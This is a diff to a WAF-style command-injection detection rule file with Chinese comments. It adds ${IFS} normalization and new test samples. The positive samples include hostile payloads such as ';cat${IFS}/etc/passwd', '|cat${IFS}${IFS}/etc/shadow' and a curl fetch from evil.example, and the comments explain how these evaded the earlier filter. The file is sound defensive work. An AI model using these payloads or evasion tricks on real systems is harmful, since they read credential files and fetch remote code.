@@ -37,9 +37,12 @@ rules:
     # 而算子恰恰靠"分隔符 + 命令名"判断命令注入 —— 于是 `?host=127.0.0.1%0aid`
     # 这种换行分隔的载荷在归一化阶段就被抹平、算子再也配不上（实测 0 分）。
     # 算子自己会用 TrimLeft 跳过 `;` 后面的空格与 tab，不需要这道归一化。
+    # normalizeIFS 把 `${IFS}` / `$IFS` 折叠成空格 —— 它们是"空格"的 shell 写法，
+    # 不折的话算子只认空格/tab，`;cat${IFS}/etc/passwd` 这类就整条漏检。
     transforms:
       - urlDecode
       - urlDecode
+      - normalizeIFS
       - lowercase
     operator:
       name: containsShellChars
@@ -54,6 +57,9 @@ rules:
         - "10.0.0.1%0acat /etc/passwd"
         # 裸分号：靠 REQUEST_URI 那一份原始串命中
         - "127.0.0.1;id"
+        # ${IFS} 当空格用（crackweb 实测绕过形态）
+        - ";cat${IFS}/etc/passwd"
+        - ";cat$IFS/etc/passwd"
       negative:
         - "Cats; dogs; and birds"
         - "the total is $5 (approx)"
@@ -62,6 +68,8 @@ rules:
         - "line1\ncat photos are cute"
         - "note\nid card number is required"
         - "intro\nsh photos from the party"
+        # 只提到 ${IFS} 这个概念、没有分隔符+命令名的正常文本
+        - "the ${IFS} variable is described in the shell guide"
 
   - id: RCE-6002
     phase: 2
@@ -104,10 +112,13 @@ rules:
     targets:
       - collection: ARGS
       - collection: REQUEST_BODY
+      - collection: REQUEST_URI
     transforms:
       - urlDecode
       - urlDecode
       - replaceComments
+      # `${IFS}`/`$IFS` 先折成空格，下面的 \s+ 才认得出"命令 + 参数"的分隔
+      - normalizeIFS
       - compressWhitespace
       - lowercase
     operator:
@@ -121,11 +132,16 @@ rules:
         - "& ping -c1 127.0.0.1"
         - ";id;"
         - "&& curl http://evil.example/x.sh"
+        # ${IFS} + 通配符（crackweb 那一条）
+        - "; cat${IFS}/etc/pass?d"
+        - ";cat$IFS/etc/passwd"
+        - "|cat${IFS}${IFS}/etc/shadow"
       negative:
         - "Cats; dogs; and birds"
         - "the order id 42 is missing"
         - "Separator: A | B | C"
         - "the total is 3; select the option"
+        - "use ${IFS} when you need a literal space in shell scripts"
 
   - id: RCE-6004
     phase: 2
@@ -578,6 +594,7 @@ rules:
     targets:
       - collection: ARGS
       - collection: REQUEST_BODY
+      - collection: REQUEST_URI
       - collection: REQUEST_HEADERS
     transforms:
       - urlDecode
